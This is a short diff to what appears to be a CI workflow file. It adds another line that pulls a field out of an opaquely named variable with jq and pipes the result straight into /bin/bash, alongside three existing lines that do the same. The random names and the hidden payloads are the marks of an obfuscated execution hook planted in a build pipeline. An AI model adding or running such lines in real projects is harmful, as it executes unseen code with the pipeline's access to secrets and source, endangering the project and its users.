@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$ov21127" | jq -r .lundl376 | /bin/bash
           echo $awdp625 | jq -r .w0070 | /bin/bash
           printf '%s' "$ua6671" | jq -r .jhjo59 | /bin/bash
+          printf '%s' "$bozlp20" | jq -r .s33 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
